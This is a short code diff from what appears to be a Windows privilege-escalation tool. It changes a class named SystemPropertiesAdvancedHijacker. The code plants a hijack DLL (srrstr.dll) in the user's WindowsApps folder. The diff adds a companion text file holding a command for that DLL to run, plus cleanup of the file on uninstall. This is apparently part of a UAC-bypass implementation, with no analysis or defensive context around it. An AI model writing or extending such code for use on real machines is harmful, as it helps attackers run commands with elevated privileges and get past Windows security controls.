@@ -23,7 +23,9 @@ bool SystemPropertiesAdvancedHijacker::SystemPropertiesAdvancedHijacker::Install
 
 		if (!Wrapper::WriteToFile(L"%LOCALAPPDATA%\\Microsoft\\WindowsApps\\srrstr.dll", pDllData, dwDllDataSize, false))
 			break;
-
+		
+		if (!Wrapper::WriteToFile(L"%LOCALAPPDATA%\\Microsoft\\WindowsApps\\srrstr.txt", (LPBYTE)wzCommand, wcslen(wzCommand) * sizeof(WCHAR), false))
+			break;
 				
 		bResult = true;
 		
@@ -48,6 +50,7 @@ bool SystemPropertiesAdvancedHijacker::Run()
 void SystemPropertiesAdvancedHijacker::Uninstall()
 {
 	Wrapper::RemoveFile(L"%LOCALAPPDATA%\\Microsoft\\WindowsApps\\srrstr.dll");
+	Wrapper::RemoveFile(L"%LOCALAPPDATA%\\Microsoft\\WindowsApps\\srrstr.txt");
 }
 
 
